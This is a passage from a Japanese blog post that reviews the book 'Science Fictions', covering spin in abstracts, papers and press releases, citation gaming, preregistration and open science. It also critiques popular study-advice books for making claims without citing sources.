それによると、「革新的(innovative)」「有望(promising)」「頑健(robust)」の使用率は飛躍的に増加しており、「ユニーク(unique)」「前例のない(unprecedenied)」も(逆説的 かもしれないが)大幅に増えて、「良好な(favourable)」は着実に増えている。

「画期的(groundbreaking)」は、1999年頃までは ほぼゼロで推移していたが、何らかの理由で突然、増加した。

平均すると、これらの自画自賛のポジティブな言葉の使用率 は、1974年のわずか2%から2014年には17.5%と、分析期間を通じて9倍近くに増えている。

この論文の著者たちは、「過去40年間のポジティブな単語の増加傾向から推定すると、2123年にはすべて(のアブストラクト)に『斬新 (novel)』という言葉が登場するだろう」と痛烈に結んでいる。

(改行引用者) 『Science Fictions』から引用



論文を読むときは「タイトル詐欺」だけでなく「アブストラクト詐欺」にも注意しないといけないということです。

論文を根拠に何かを主張している人がいたら、その人がちゃんと論文の本文を読んでからそう言っているのか、それともアブストラクトだけしか読まずにそう言っているのか、ちゃんと確認した方が良さそうです。









論文の本文は信用できるか？



じゃあ、論文の本文は信用できるのでしょうか？

ところが、スピンは、アブストラクトだけではなく、本文にも蔓延しているのです。

科学のスピンについては数多くの論文があり、それぞれの分野の現状を明らかにしている。

たとえば、産科・婦人科の臨床試験のうち15%は、有意ではない結果をあたかも治療の効果を示しているかのように見せている。

ガンの予後検査に関する研究の35%は、有意でない結果をあいまいにしてわかりにくくするためにスピンを使っていた。

複数の一流学術誌に掲載された肥満治療の臨床試験の47%に何らかのスピンがおこなわれていた。

抗鬱薬と不安神経症の治療薬の臨床試験について報告している論文の83%が、研究デザインに関する重要な限界を議論していない。

脳機能イメージングの研究に関するレビューは、相関関係を因果関係に誇張することが「横行」していると結論づけている。

スピンのなかには、不正行為に発展したり、少なくとも重大な機能不全にいたったりするものもある。

2009年のレビューによると、中国の医学誌に掲載されたランダム化対照試験と称する研究のうち、実際にランダム化をおこなっているのはわずか7%だった。

(改行引用者) 『Science Fictions』から引用

実際、論文の「実験手続き」と「実験結果のデータ」が、本文の文章と一致しないことは珍しくありません。

なので、私が論文を読むときは、最初に論文全体をサクッと斜め読みしたら、すぐに「実験手続き」と「実験結果のデータ」をチェックします。

その後に本文の文章をちゃんと読むと、「この実験手続きとこの結果データからそれを主張するのは無理があるor言い過ぎだろ」ということが書いてあることが、よくあるのです。

というわけで、論文の本文の文章を引用して、「この論文には、こう書いてある」と、どや顔で自説を主張の根拠を示す人がいたら、「その論文の文章は、本当に、その実験手続きとデータから主張できることなのかな？」と疑問を持った方がいいです。









プレスリリース

論文が出版されると、そのプレスリリースがメディアに向けて発表されます。

プレスリリースとは、ニュース素材としてメディアの記者が利用しやすいように、文書や資料としてまとめたもののことです。

プレスリリースの作成にも、科学者が深く関わっています。

科学分野のプレスリリースは広報担当者だけで作成するわけではなく、科学者が深く関わっていることはあまり知られていない。

科学者が自ら全文の草稿を書くこともある。

何も知らない研究者が自分の仕事に集中しているときに、メディアが突然、彼らの発見を取り上げて大げさに報道するという筋書きは、決してよくあることではない。

(改行引用者) 『Science Fictions』から引用

イギリスのカーディフ大学の研究者を中心とした2014年の研究では、健康に関する科学研究のプレスリリース数百件を調べ、そこで説明されている研究と、最終的に発表されたニュース記事を照合しました。

その結果、プレスリリースには以下の３種類の誇大広告があることが分かりました。

(1)正当な根拠のないアドバイス

人々が行動を変えるべき方法(特定の種類の運動をすすめるなど)を提案するプレスリリースは、その研究結果が裏づけるよりも短絡的または直接的だった。

この傾向は検証の対象となったプレスリリースの40%に見られた。

(改行引用者) (『Science Fictions』より引用)



(2)異種間の飛躍

マウスで得られた結果の90%は、最終的に人間には適用されない。

＜略＞

カーディフ大学の研究チームによると、動物実験の初期段階で得られた結果が人間にとって重要な意味を持つことを暗示したり、あるいは明確に主張したりして、プレスリリースを誇張する例はなくならない。

調査したプレスリリースの36%にこのような誇張が含まれていた。

一方、ヘルス部門の研究に関するニュース記事は、 その研究が人間を使っておこなわれたものではないという事実を、第8段落か第9段落のどこかに埋もれさせることもめずらしくない。

(改行引用者) (『Science Fictions』より引用)



(3)分かったのは相関関係なのに因果関係が分かったかのように書く



＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝

カーディフ大学の研究では33%のプレスリリースが因果関係を強調していた。

自分たちの観察の結果や相関的な結果が、あたかもランダム化された実験から得られたもので、何が原因かを明らかにできるかのように書かれていたのだ。

(改行引用者)

＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝

(『Science Fictions』より引用)



これ、本書では「誇大広告」と表現されていますが、はっきり言うと、単なるウソでは。

その研究の結果のデータから言えないことを、あたかも言えるようにウソついてアドバイスしてるんですから。

動物実験から得られた結果の多くは人間には適用できないのに、そのまま人間にも適用できるかのように言うのもウソですよね。

そのデータからは、相関関係しか分からないのに、因果関係が分かったかのように言うのも、ウソですよね。

まとめると、科学者自身がプレスリリースでウソをつき、そのウソをメディアが報道し、そのウソニュース記事を、一般人が「健康に役立ついい情報だ」と思って読むことがけっこうあるわけです。













引用されるためのウソと誇張



この章では双六の「引用」について説明します。



世間は、権威ある学術誌を信用しますし、権威ある科学者を信用します。

しかし、そもそも、その「権威」は、何によって決まっているのでしょうか？

実は、論文も科学者も学術誌も、その権威は、被引用数に大きく影響されています。

たとえば、権威ある学者というのは、権威ある大学の教授とかです。

その権威ある大学の教授のポストに収まるのは、どんな科学者でしょうか？

アカデミックなポストへの採用や昇進で明示的に考慮されることが多いのがh指数です。

h指数は、「少なくともh回引用されている論文がh本以上ある」ことを意味します。

また、学術誌の権威は、インパクトファクターに大きく影響されます。

その学術誌に掲載された論文一本当たりの被引用数が多ければ多いほど、インパクトファクターは大きくなります。

具体的にはどうやって計算するかというと、たとえば、2024年のある学術誌のインパクトファクターは、2021年と2022年に掲載した論文が2023年に引用された回数の平均です。

この記事の執筆時点のインパクトファクターは、Natureが69.504、Scienceが63.832、Lancetが168.9です。

このため、学術誌の多くは、被引用数が大きくなりそうな論文を掲載する傾向にあります。

また、大学の権威は、そこに所属する科学者の論文が、どれだけ一流の学術誌に掲載されたかに大きく影響されます。

大学の権威もまた、論文の被引用数に大きく影響されているわけです。

このため、科学者の多くは、自分の論文の被引用回数を増やしたいという強い動機があります。

ブロガーやYouTuberが自分のコンテンツをネットでバズらせたいように、科学者も自分の論文を科学者コミュニティでバズらせたいわけです。

引用がSNSのバズに似ている点は、それだけではありません。

もちろん、論文を引用されるための最善の方法は、重要で画期的な結果を出すことだ。

研究者のなかには、自分の結果がまさにそのようなものであることを学術誌に(そして世界に)納得させるために、途方もない時間を費やす人もいる。

前章で説明したような「スピン」も、引用されやすくする方法だ。

ある研究では、有意な結果を示した論文は、NULLの結果を示した論文に比べて1.6倍多く引用されているが、著者が「結果は自分の仮説を支持する」と明確に結論づけている論文は2.7倍多く引用されている。

要するに、論文を引用されたいなら、よりポジティブな表現で書けばいいのだ----研究の結果について、洗練されていないが現実的で鋭い部分を、ことごとく言葉で研磨して滑らかにすることにはなるが。

(改行引用者) 『Science Fictions』から引用

まんま、ブロガーやYouTuberにも当てはまりそうな文章です。

Web記事や動画をバズらせるための最善の方法は、重要で画期的なコンテンツを作ることです。

ブロガーやYouTuberのなかには、自分のコンテンツがそのようなものであることをネットユーザーに納得させるために、途方もない時間を費やす人もいます。

話を盛ったり、誇張したりすることも、リツイートされやすくする方法です。

ポジティブなことを断定的に言っているツイート/ブログ記事/動画は、リツイート回数が何倍にもなりがちです。

論文にスピンが入り込む大きな原因の一つが、この「引用」なのです。

そもそもGoogleが世界一の検索エンジンになったきっかけは、「ページランク」というアルゴリズムを使って検索結果を表示したからですが、少なくとも初期は、被リンク数がページランクを決める重要な指標の一つでした。

これは、元々、被引用数が論文の評価を大きく左右するアカデミックな世界の慣習からヒントを得たと言われています。

そのGoogleの検索結果は、今や、SEOスパムにやられまくって汚染されてしまっているわけですが、似たようなことが、論文の被引用数でも起きているわけです。

この被引用数ゲームがもたらす影響を図にすると、以下のようになります。

そもそも、なぜ、メタアナリシスの結果が歪むかというと、出版バイアスのせいです。

なぜ、出版バイアスが起きるかというと、NULL論文が出版されにくいからです。

なぜ、NULL論文が出版されにくいかというと、それを学会誌が掲載したがらないし、大学も、NULL論文を実績としてあまり高く評価しないからです。

なぜ、学会誌がNULL論文を掲載したがらないかというと、それが引用されにくいからです。

なぜ、大学が、NULL論文を実績としてあまり高く評価しないかというと、それが引用されにくいからです。

なぜ、NULLの結果が出ると、研究者は、データをこねくり回して、無理矢理、それを統計的に有意の結果に見せがちなのかというと、NULL論文が学会誌にも大学にも評価されにくいからです。

なぜ、論文にもアブストラクトにもスピンが入りがちかというと、その方が、被引用数が多くなりがちだからです。

この図を見て分かるように、問題は、以下の２つから発生しています。

(1)アカデミックな世界全体が被引用を評価基準として重視しすぎ。

(2)NULL論文は引用されにくい。

で、これらの解決策としては、

まず、(1)の問題については、「引用」以外の評価基準(後述)も、もっと重要視することで緩和されます。

また、(2)のNULL論文が引用されにくい問題については、NULL論文の評価を高くするための仕掛けを入れることで緩和されます。

ちなみに、この本では、他にも、被引用数を増やすハッキングの手口を紹介しています。

●自分の過去の論文を過剰に引用する。

●学術誌の編集長が論説で自分の論文を過剰に引用する。

●学術誌の論説で、その学術誌のインパクトファクターを増やすことに貢献する論文の引用を過剰にやる。

●複数の学術誌で引用カルテルを結んで、相互に引用し合う。

●一つの論文にまとめられる内容を、複数の論文に分割して、相互に引用し合う。

これって、なんだか、どっかで見たことあるような……

相互に言及し合うブロガー/YouTuber/インフルエンサーや、同じメディアに掲載されるライター同士の相互言及って、まんまじゃないですか。

そう、ネットに似てるんですよ。

ネットに飛び交う情報が歪んでいるのと似たような原理で、学会に飛び交う情報も歪んでいるというわけです。

学会は、すごく客観的で学術的に正しい情報だけが飛び交う理知的な世界かと思いきや、けっこう、人間くさいところのようです。













バイアスの累積

これまで説明してきたようなバイアスは、累積していきます。

精神医学を研究するユムジェ・アナナ・デ・フリースらは、新薬の治験から最終的に世の中に出るまでに発生するすべてのステップを検証しました(2018年)。

その結果の詳細は長くなるので、本書に譲り、ここでは、その概要の図だけを引用するにとどめます。

(『Science Fictions』より引用)



これは、ある抗うつ剤に効果があるかを検証した実験が多数行われたときの様子です。

最初は、「効果があった」という結果と、「効果がなかった」という結果が、半々でした。(図の左端の状態)

〔出版バイアス〕 しかし、「効果が検出されなかった」という論文は半分くらいしか出版されないのに対し、「効果が検出された」という論文はほとんど全部出版されるので、「効果が検出された」という論文の方がずっと多くなります。

〔結果の切り替え〕 次に、統計的に有意にならなかった場合に、研究の焦点を変更したり、統計分析の手法を変更したりを、統計的に有意になるまで繰り返します。

すると、残った「効果が検出されなかった」という論文のうち、何割かが、統計的に有意な結果になります。

〔スピン〕 それでも統計的に有意にならなかったものの何割かが、スピンによって、まるで効果があったかのように印象づけるように表現が工夫されます。

〔引用のバイアス〕 最後に、「効果が検出されなかった」と報告する論文よりも、「効果が検出された」と報告する論文の方が引用されやすいので、「効果が検出されなかった」という論文の影響力は小さくなり、「効果が検出された」という論文の影響力は大きくなります。

Googleスカラーなどの論文検索においても、被引用数の多い論文の方が検索上位に来ますので、普通に論文検索すると、「効果が検出された」という論文ばかりが目につくようになります。

こうして、バイアスが累積していき、抗うつ剤の効果とその信頼性が、過大評価されてしまうのです。









YouTuber/ブロガー



YouTuber/ブロガーは、どれくらい信用できるのでしょうか？

具体例がないとイメージがわきにくいと思うので、メンタリストDaiGo氏の『超効率勉強法』を例にして話します。

この本は、論文の出典を示しているところもありますが、出典を示していないところの方が多いです。

たとえば「テキサス大学が、かつてこんな実験をしました。」と書いてあるところがありますが、テキサス大学に所属するどの研究者が何年に出版した論文なのかが分からないので、論文を特定するのは難しいです。

一方、以下のような記述は、根拠となる論文の出典は記されていませんが、検証は可能です。

非効率勉強法5 集中学習



5つ目は、「集中学習」です。

これは、数時間のまとまった時間を取って、1つの科目や単元だけを徹底して学ぶ手法のこと。現在完了形を身につけたいなら現在完了形だけを、ベクトルを理解したいならべクトルだけを通しでやっていくテクニックで、一部の予備校などでも採用されているケースを見かけます。 (メンタリストDaiGo『超効率勉強法』 より引用)

ただし、検証には、手間がかかります。

たとえば、「数学だけ２時間勉強する」で学習効率が落ちなかったとしても、「行列だけ２時間勉強する」、「行列の回転だけ２時間勉強する」、「ある一つの行列の回転の問題だけ２時間勉強する」のいずれかで、学習効率が落ちる可能性があります。

もし、「ある一つの行列の回転の問題だけ２時間勉強する」が非効率だったとしても、「数学だけ２時間勉強する」の学習効率はとくに落ちない場合、DaiGo氏のアドバイス通りにすると、トータルの学習効率は下がります。

たとえば、数学を勉強していて、調子が出てきたとします。

そこで、DaiGo氏の本に書かれていたことを思いだし、数学の勉強を1時間やったところでいったん休憩したら、そのままゲームをしたり、SNSをやったりしているうちに、残りの１時間の勉強をしないケースが出てくるかもしれません。

実際に「数学だけ２時間勉強すると学習効率が落ちる」が科学的事実なら、まあ、それもしかたないかもしれません。

しかし、もし、「数学だけ徹底的に勉強する」の学習効率がとくに落ちないのなら、調子が出てきたときは、ノリと勢いに任せて、集中力の続く限り、半日でも丸一日でも飽きるまで数学をやりまくった方が、トータルの学習効率は上がります。

また、集中学習をしないということは、間隔を空けて学習をすることになりますが、その「間隔」の長さによって、学習効率はどのように異なるのでしょうか？

「間隔」は「1分」「5分」「30分」「1時間」、どのくらいあけると、学習効率はどのようになるのでしょうか？

「1分」あけても「1時間」あけても学習効率が変わらないなら、「間隔」は1分にした方が得です。

また、「間隔」の間、何をしているのかが問題です。

ぼーっとしているのと、ゲームをしているのと、読書をしてるのと、他の科目を勉強しているのとで、学習効率に違いはでるのでしょうか？

違いが出ないなら、他の科目を勉強していた方が、トータルの学習効率は上がります。

これについて、DaiGo氏は、この本で以下のように述べています。

なぜ集中学習は効果がないのでしょうか？

ここ数年の研究により、人間の脳は、状況に応じて2つのモードを切り替えていることがわかってきました。

・集中モード……目の前の情報に注意深く意識が向いている状態

・緩和モード……リラックスして思考がさまよっている状態

言うまでもなく、集中学習で使われるのは「集中モード」です。このとき、あなたの頭は分析に物事を考える 力がオンになり、目の前の情報を理解すべくフル回転しています。

ただし、「集中モード」だけで真の知識は身につきません。 (メンタリストDaiGo『超効率勉強法』 より引用)

ようは、「間隔」の間、リラックスしてる必要があるということです。

これが本当なら、「間隔」の間は、ぼーっとしているか、入浴するか、散歩でもしていた方がよさそうです。

また、英単語のような単純な「暗記」をする場合と、数学のような頭を使って「思考」する場合では違いが出るのでしょうか？

英語の発音はどうでしょうか？ 英語の発音は、口、舌、喉の沢山の筋肉を連係動作する「運動」の学習です。

もし、「暗記」の場合には集中学習の効率が悪いとしても、「思考」や「運動」の集中学習の効率が悪くならないとしたら、数学や発音練習では、ノリと勢いが続く限り、集中学習した方が得、という話になります。

また、「教科書を読む」と「問題集を解く」の両方とも、集中学習の効率は悪いのでしょうか？

前者はインプットで、後者はアウトプットではないのでしょうか？

もし、インプットの集中学習が非効率で、アウトプットの集中学習が非効率でないとしたら、アウトプットをやっている場合は、集中学習をやってもいいということになります。

こんな感じの懸念点を、一つ一つ、論文のデータと突き合わせて検証してみたのですが、大変に手間のかかる作業でした。

それを、集中学習に限らず、学習効率に大きく影響すると考えられるさまざまな要因について、一通り検証したら、一年かかりました(その結果をまとめたのが拙著『最新研究からわかる 学習効率の高め方』です)。

この検証過程で分かったのは、『超効率勉強法』の主張は、間違っているというより、ズレていたり、雑だったりするということです。

ズレているというのは、学習効率を大きく左右するポイントじゃないところを、さも大きく学習効率に影響するかのように言っているということです。

それよりもはるかに重要なポイントは、別の場所にたくさんあるのに。

「雑」とはどういうことか？

たとえば、『超効率勉強法』の以下の記述が、その典型です。

非効率勉強法4 テキストの再読



4つ目は「テキストの再読」。これも、やってはいけない勉強法です。

ご存じのとおり、1つの教科書や参考書を何度も読み返すテクニックのことで、 (メンタリストDaiGo『超効率勉強法』 より引用)

これも、たくさんの論文のデータと突き合わせて検証してみました。

それで分かったのは、「テキストの再読」は、実験条件によって、効率的になる場合と非効率になる場合の両方があるということです。

つまり、効率的になるような条件下で、効率的になる方法でテキストの再読をすれば効率的だし、非効率になるような条件下で非効率になるような方法でやれば非効率になります。

場合によっては、「テキストの再読」をしない方が非効率になります。

どうして、彼は「テキストの再読」が「非効率勉強法」だと思ったのでしょうか？

(1)実験条件と実験手続きの吟味が不十分だから

実験条件と実験手続きの細部を十分に吟味していれば、「テキストの再読」が非効率になるのは、ある特定の実験条件と実験手続きの場合だけだと分かるはずです。

(2)過度な一般化をやっているから

ある特定の条件下でテキストの再読が非効率だったということを根拠に、「テキストの再読」一般が非効率だと思い込んでいます。

(3)吟味した論文の数が少なすぎるから

学習効率に関する他の論文のデータを吟味していれば、「テキストの再読」が非効率になるのは、ある特定の条件下だけだと、すぐに気がつくはずです。

(4)点と点をつなげていないから

彼がやってるのは、象の足だけ見て、「象とは柱のような生き物である！」と主張していることと同じです。

たくさんの論文のデータを突き合わせ、同じ現象をさまざまな角度から見ることではじめて、象の全体像が浮かび上がってきます。

(5)チェリー・ピッキングをしているから

自説に都合のいい論文だけ読んで、自説と矛盾する論文をスルーしています。

再現実験したらNULLの結果になりました、とか、効果はあったけど微弱でした、という論文が出回っていても、見なかったことにしてます。

自説と矛盾する論文と向き合わない限り、「象とは柱のような生き物である」という思い込みから抜け出すことはできません。

「壁みたいだぞ」「でかい牙があるぞ」などの論文も受け入れることではじめて、「どうも柱じゃないっぽいな……」と気がつき、象の全体像の理解が始まるのです。



誤解のないように言いますが、これ、全然、DaiGo氏個人の問題じゃないです。

YouTuber/ブロガー/ライター/作家が、科学実験を紹介しながら自説を主張する場合の多くが、こんな感じです。

間違っているというより、ズレていて、雑で、過度な一般化をやっていて、象の足だけ見ていて、針小棒大で、チェリー・ピッキングで、確証バイアスゾンビなのです。

『Science Fictions』を読んでいると、科学者の言ってることが、いまいち信用ならない気がしてきますが、YouTuber/ブロガーの主張を論文のデータと突き合わせて検証すると、彼等よりも科学者の方がはるかに信用できるということがよく分かります。

比較すること自体が科学者に失礼、というレベルです。













事前登録



ダメな論文が蔓延しないように、科学者や政府は、どのような努力をしているのでしょうか？

最も効果的な対策の一つが、事前登録です。

これは、実験計画を事前に登録してから、実験を始める方法です。

これをやると、統計検定をやって、統計的に有意にならなかった場合に、統計手法を変えたり、データを分割したりして、統計的に有意になるパターンを見つけ出すようなことをやって論文を書いたら、バレます。

「ん？ 実験計画では統計検定Aをやるって書いてあったのに、この論文では統計検定Cをやって有意になったって書いてるよね。だとすると、そのp値は、その値が示すほどの信頼性はなさそうだな」と分かってしまうのです。

あるいは「実験計画では、身長の違いによって、効果が出たり出なかったりするなんて仮説を立てていなかったのに、論文では、はじめからその仮説を立てて検証実験を行ったかのように書いてある。この論文の主張は、話半分に聞いておいた方が良さそうだな」と分かってしまいます。

以下、『Science Fictions』から引用します。

事前登録は、アメリカでは2000年から政府の資金援助を受ける臨床試験に義務づけられており、2005年以降は大半の医学雑誌で論文掲載の前提条件になっている。

登録にあたり、研究者はデータを収集する前に、 どのようなことをする計画なのかを詳細に記した文書にタイムスタンプをつけてオンラインで公開する。

(改行引用者) 『Science Fictions』から引用

事前登録の威力は絶大です。

心臓病予防に関する大規模な臨床試験の研究は、事前登録の影響を端的に語っている。

＜略＞

事前登録が必要になる前の臨床試験の成功率は57%だったが、その後は8%まで激減している。

繰り返しになるが、事前登録が必要になる前は、心臓病に「効果があると思われる」多くの研究がおこなわれ、大成功を収めていたのだ。

やがて真実が明らかになった。

これらの研究で試された薬や栄養補助食品は、私たちが信じさせられていたほどに有用ではまったくなかったのだ。 『Science Fictions』から引用



事前登録が義務づけられる前と後でどう変わったかのグラフを、本書から引用します。

(『Science Fictions』より引用)

事前登録が義務づけられた2000年を境に、NULL論文(統計的に有意な結果の出なかった論文)が激増し、統計的に有意の結果の出た論文が少なくなったことが分かります。

逆に言うと、事前登録が義務づけられていなかった時代は、いかにいい加減な論文が蔓延していたかが、よく分かります。

恐ろしいですね。

古い論文には、くれぐれも注意しましょう。









オープンサイエンス

さらに一歩進んで、実験の各ステップのデータを、サーバに登録しておくという方法があります。

たとえば、実験を行って、被験者からデータを取ったら、それをすぐにアップロードするのです(アップロード時にタイムスタンプが付きます)。

こうすると、査読者は、論文のデータが怪しいと思ったら、生データにアクセスし、生データに不正な変更が加えられていないか、監査することができます。

また、研究のプロセスが全部ログられていると、それらを改ざんして論文を書くのは、かなり困難になります。

さらに、プログラムで自動的にデータの間違いや不正をチェックできるようにする試みも増えてきています。

人力でやるより、はるかに効率よく不正を検出できるようになります。

サーバに登録したデータに誰でもアクセスできるようにすることで、その論文を不審に思った人は誰でも、その論文の生データにアクセスして、はたして、その論文が、そのデータから言えることを主張しているのかどうか、検証することができるようになります。

また、学術誌に掲載される前の論文を、サーバで公開し、誰でも自由に閲覧できる仕組みも普及してきました。

新型コロナ騒動のときに大活躍したプレプリントサーバーが、それです。

査読者だけでなく、論文を検証した人は誰でも、論文にコメントをつけられるような仕組みも導入されてきているようです。

プレプリントサーバーには、以下のような利点があると考えられています。

まず、学術誌には、NULL論文を掲載したがらないというバイアスがありますが、プレプリントサーバーには、それはありません。

NULL論文だからという理由で、プレプリントサーバーで公開できないという制限はないからです。

このため、プレプリントサーバーは、出版バイアス問題を緩和する効果があると考えられています。

また、ありもしない効果を検出して論文にしてしまう確率を下げることが期待されます。

なぜなら、研究者たちが、データをこねくり回して、無理矢理統計的に有意な結果を出そうとするのは、そうしないと、学術誌に掲載してもらえず、論文を出版できないからです。

プレプリントサーバーであれば、どんな結果であっても公開できるので、無理矢理統計的に有意な結果を出さなくてはならないというプレッシャーが下がることが期待できます。

論文の本文やアブストラクトに入り込むスピンも、同様の理由で、減ることが期待されます。

さらに、プレプリントサーバーは、公開までのスピードが圧倒的に速いです。

従来なら、査読だの編集だのの手続きが必要なので、出版までに数ヶ月～数年かかるところを、プレプリントサーバーなら、すべてをすっとばして、すぐに公開できます。

だから、新型コロナのときに大活躍したのです。

もちろん、そのデメリットもあって、一流の学術誌にはまず掲載されることのないレベルのあちゃーな論文も公開されるので、プレプリントサーバーに公開された論文を読むときは、その点は注意する必要があります。

要するに、研究の計画、各ステップのログ、データ、論文、コメントを、全世界にどんどん無料公開していくのです。

それによって、不正、バイアス、過失、誇張を減らしていくわけです。

この潮流は、「オープンサイエンス」と呼ばれています。

このオープンサイエンス運動は、研究資金の提供者も後押ししています。

近年は研究資金の提供者が、研究がオープンアクセスで公開されることを要求するようになった。

研究資金提供組織の協会であるサイエンス・ヨーロッパの「プランS」は、メンバーが資金提供するすべての研究について、完全なオープンアクセスの学術誌に掲載することを義務づけている。

この野心的な戦略はヨーロッパ16カ国の政府系機関のほか、ウェルカム・トラストやビル&メリンダ・ゲイツ財団など主要な研究資金提供組織が採用している。

プランSの規定では、 サイエンス・ヨーロッパの助成金を得た科学者は、完全にオープンアクセスではない学術誌に論文を投稿することはできない。

ただし、現段階で『サイエンス』や『ネイチャー』を含む学術誌全体の85%が、完全なオープンアクセスを認めていない。

(改行太字引用者) 『Science Fictions』から引用

実は、学術誌が、オープンサイエンス運動を阻害しているんです。

なぜかというと、論文が誰でも無料でダウンロードできるようになったら、彼等の売り上げが減るからです。

こうした購読料がいかに「法外」なものかは、あらためて考える意味がある。

ノーベル賞を受賞した生物学者で学術誌の編集者も務めるランディ・シェクマンは2019年に、カリフオルニア大学が非営利組織のナショナル・アカデミー・オブ・サイエンスと営利企業のエルゼヴィアという2つの出版社に払った購読料を比較した。

科学論文を1本ダウンロードする料金は、ナショナル・アカデミー・オブ・サイエンスの0.04ドルに対してエルゼヴィアが1.06ドルと、実に26倍を超えている。

世界中の研究者がエルゼヴィアに数百万ドルを支払っており、その額は営利の出版社全体で数十億ドルにのぼる。

これだけの金を払って、どんな特別サービスがあるのだろうか。

少なくともナショナル・アカデミー・オブ・サイエンスが発行している学術誌は、エルゼヴィアの学術誌と基本的に同じか、それ以上のサービスを提供している。 (『Science Fictions』から引用)

学術誌の顧客の多くは大学や研究所などの公的機関です。

つまり、学術誌の売り上げのかなりの割合が、我々一般人の払った税金から来ています。

また、論文を書く研究者の生活費も研究費も税金でまかなわれています。

彼らは、論文の著者に印税も払いません。

つまり、学術誌は、税金を使って書かれた論文を、税金で買ってもらって、大きな利益を出している機関です。

その学術誌が、オープンサイエンスを阻害し、出版バイアスなどの問題の解決を阻害しているわけです。

なので、納税者である我々は、二重の意味で、学術誌から被害を受けています。

第一に、税金を不当に搾取されているという意味で。

第二に、オープンサイエンスを阻害し、科学研究をゆがめ、我々の健康や人生に害を与えているという意味で。

なので、納税者である我々一般人こそが、この問題にもっと関心を向け、オープンサイエンスを推進し、学術誌が不当な利益を上げるのをやめさせるように圧力をかけていく必要があるのではないでしょうか。

ちなみに、「論文一本あたり1.06ドル」というのは、大学とかが学術誌を購読している場合の平均単価です。

われわれ一般人が、論文を買おうとすると、一本あたり５千円とかを払わなければなりません。

私は、論文を買うたびに、とても嫌な気分になります。













一般人がやるべき対策

じゃあ、我々一般人は、これまで見てきた問題について、どのような対策をすればいいのでしょうか？

誰でも簡単に実行できて効果抜群の対策が２つあります。





透明性

一つ目は、「透明性」です。

透明性を基準に行動すれば、騙されるリスクは劇的に下がります。

たとえば、「事前登録」は、透明性を高める仕組みです。

事前に、そんな実験計画を立てていたかを透明化しているからです。

今後、論文は、「事前登録」された実験なのかどうかが、一目で分かるようになっていくと思います。

論文のタイトルの末尾に事前登録マークがつくとか。

また、YouTuber/ブロガーが、論文を根拠に何か言う場合、根拠としている論文が事前登録論文なのかを表示するのが当たり前になっていくと思います。

事前登録しているかどうかで、信頼性が大きく違うからです。

我々一般人は、それが事前登録された論文なのかどうか、確認することで、ある程度の信頼性を担保できます。

この透明性の原則は、YouTuber/ブロガー/本にも当てはまります。

YouTuber/ブロガー/本の透明性とは、根拠としている論文の出典を明らかにすることです。

実際に、YouTuber/ブロガー/本の主張の裏取り調査をしてみると、透明性が低いほど腐敗していることが、露骨に分かります。

裏取り調査とは、関連する論文の実験条件/実験手続き/データを吟味して、突き合わせ、YouTuber/ブロガーの主張の妥当性を検証することです。

腐敗とは、「テキストの再読は、非効率な学習法である」みたいな、間違っているというより、ズレていて、雑で、過度な一般化をやっていて、象の足だけ見ていて、チェリー・ピッキングで、確証バイアスゾンビな主張のことです。

なんで、根拠としている論文の出典をあかさないと、腐敗するのでしょうか？

科学者でも、一般人でも、不透明なほど、インチキをやる人間が増えるからです。

事前登録を義務化したら、心臓病に関する怪しい論文が激減したのと、原理は同じです。

事前登録しなければ、データをこねくり回して、有意な結果が出た後に、「最初から、こういう仮説を検証しようとしてたんだよ」とウソをつくことができます。

だから、事前登録しないと、インチキ論文が横行しました。

バレなきゃウソをつく人は、一般に考えられているよりも、ずっと多いんです。

YouTuber/ブロガーも同じです。

論文の出典を隠しておけば、ウソをついていても、なかなかバレません。

裏取りをする手間が爆上がりするので、ほとんどの人は、コスト的に、その裏取りができないからです。

根拠としている論文を隠しておけば、根拠としている論文から言えないことを言い放題なので、興味深いこと、面白いこと、驚くようなこと、読者を気持ちよくさせるようなこと、バズるようなことを、いくらでもでっち上げられます。

盛って盛って盛りまくることができるのです。

というか、隠しているのではなく、そもそも、そんな論文が存在してない可能性もあります。

「ある実験では」「○○大学の研究では」などと、いかにも科学的根拠があるように匂わせながら、実際には、根拠のない話をねつ造するというわけです。

インチキをやる動機も、科学者とYouTuber/ブロガーは、よく似ています。

科学者は、科学者として評価を高めるために、インチキをやって統計的に有意な結果を出し、論文本文にもアブストラクトにもプレスリリースにもスピンを入れます。

YouTuber/ブロガーは、登録者数を増やす、Amazonレビューの☆の評価を高くする、ブログの読者を増やすという目的のために、話を盛るのです。

実は、論文の出典を明記するより、さらにもっと優れた判定基準があります。

動画/ブログ記事/本のなかで、根拠となる論文の出典に加え、実験条件と実験手続きを説明しているかどうかです。

これをやった場合、誤魔化しが効かなくなります。

なぜなら、読者は、根拠としている論文を読まなくても、それが、根拠としている論文から言える主張なのかどうかが、分かってしまうからです。

実は、ここで、奇妙なパラドックスが生まれます。

「根拠としている論文から言えないことを言っている」ということが読者にバレる頻度が高いYouTuber/ブロガー/本の方が信用できるというパラドックスです。

出典を隠す人は、「根拠としている論文から言えないことを言っている」ことがバレにくいです。だから、信頼され、Amazonで大勢の人に高く評価されるのです。

一方、出典を明らかにし、実験条件と実験手続きを説明している人は、容易にインチキがバレるので、ちょっと口が滑っただけでもそれがバレてしまい、「こいつは時々インチキを言うな」と思われてしまうと言うわけです。

スゴ本さんの『ミスを責めるとミスが増え、自己正当化がミスを再発する『失敗の科学』』という記事では、ミスを責めると、ミスを隠すようになって、逆にミスが増えるという事例を紹介しています。

「根拠としている論文から言えないことを言っている」を責めると、それと同じようなメカニズムが働きます。

出典を明らかにし、実験条件と実験手続きを説明している人に対して、「根拠としている論文から言えないことを言っている」と責めると、その人は、実験条件と実験手続きを説明しなくなり、出典も隠すようになりがちです。

興味深いことに、最初は出典を明らかにしていたYouTuberが、「根拠としている論文から言えないことを言っている」と叩かれまくったために、出典を隠すようになったケースがあります。

その人の昔の本には、出典がけっこうあるのですが、最近の本では出典が書かれなくなりました。

つまり、読者の多くは、YouTuber/ブロガー/作家に、逆インセンティブを与えているのです。

出典を隠してインチキを言うほど、信用できて、面白いと、高く持ち上げます。

出典を明示して実験条件と実験手続きを明示するほど、「根拠としている論文から言えないことを言っている」と叩かれるリスクが上がります。

また、根拠としている論文から言える範囲のことしか言えなくなるために、面白くないのでAmazonレビューの☆評価も下げるわけです。

我々一般人が、本来、やるべきは、この逆インセンティブをやめ、正しいインセンティブを、YouTuber/ブロガー/作家に与えることです。

出典を明示せずに、「ある実験では……」「○○大学の研究では……」みたいに科学的根拠があるようなことを主張する人の話は、話半分……いや、話1/10ぐらいで聞いておいた方がいいです。

